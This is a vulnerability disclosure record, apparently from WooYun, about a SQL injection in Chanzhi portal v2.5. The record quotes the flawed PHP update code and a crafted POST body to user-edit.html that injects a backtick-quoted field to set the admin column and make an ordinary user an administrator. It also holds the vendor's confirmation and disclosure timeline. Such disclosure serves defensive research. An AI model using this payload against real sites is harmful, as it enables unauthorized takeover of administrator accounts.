{"id": 52352, "wybug_id": "wooyun-2014-071504", "wybug_title": "蝉知企业门户系统 v2.5 sql 注入至管理员。", "wybug_corp": "chanzhi.org", "wybug_author": "roker", "wybug_date": "2014-08-09 20:29", "wybug_open_date": "2014-11-07 20:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-07：\t细节向公众公开  简要描述： rt这代码看着有点蛋疼。不熟悉啊。。 详细说明：  问题出在 用户修改资料的地方/system/module/user/control.php\npublic function edit($account = '')    {        if(!$account or RUN_MODE == 'front') $account = $this->app->user->account;        if($this->app->user->account == 'guest') $this->locate(inlink('login'));        if(!empty($_POST))        {            $this->user->update($account);.......\n跟进updata/system/module/user/model.php\npublic function update($account)    {        /* If the user want to change his password. */        if($this->post->password1 != false)        {            $this->checkPassword();            if(dao::isError()) return false;            $password  = $this->createPassword($this->post->password1, $account);            $this->post->set('password', $password);        }        $user = fixer::input('post')            ->cleanInt('imobile, qq, zipcode')            ->setDefault('admin', 'no')            ->remove('ip, account, join, visits')            ->removeIF(RUN_MODE != 'admin', 'admin')            ->get();        return $this->dao->update(TABLE_USER)            ->data($user, $skip = 'password1,password2')            ->autoCheck()            ->batchCheck($this->config->user->require->edit, 'notempty')            ->check('email', 'email')            ->check('email', 'unique', \"account!='$account'\")            ->checkIF($this->post->gtalk != false, 'gtalk', 'email')            ->where('account')->eq($account)            ->exec();    }\nfixer这个类的代码有点长就不贴了，看上面的代码也能大概看得懂它的作用。。普通用户和管理员是在一个表的，的区别就是 admin字段。总之对我们post的数据做了 foreach然后带入了 updata当然他 有remove admin的，可是这太好绕过了。直接看利用吧~注册用户后 来到 http://localhost/user-edit.html修改资料改包post如下数据\nrealname=aaaaaa&email=a%40qqqq.com&password1=&password2=&company=&address=&zipcode=&mobile=&phone=&qq`%3D1,`admin=super&gtalk=\n即可提升成为管理员。可以看mysql的日志\n\n   漏洞证明：  \n\n官网测试了下，可惜后台改了。不出意外，应该提升了 用户名为 testwooyun 的用户 为管理员了~   修复方案：  不要放在一个表里。   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-08-12 17:00 厂商回复： 会影响到打开会员功能模块的站点。近期会发布版本修正该问题。谢谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-09 21:02 |    \t\t阿布 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        )\t\t \n  R牛。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}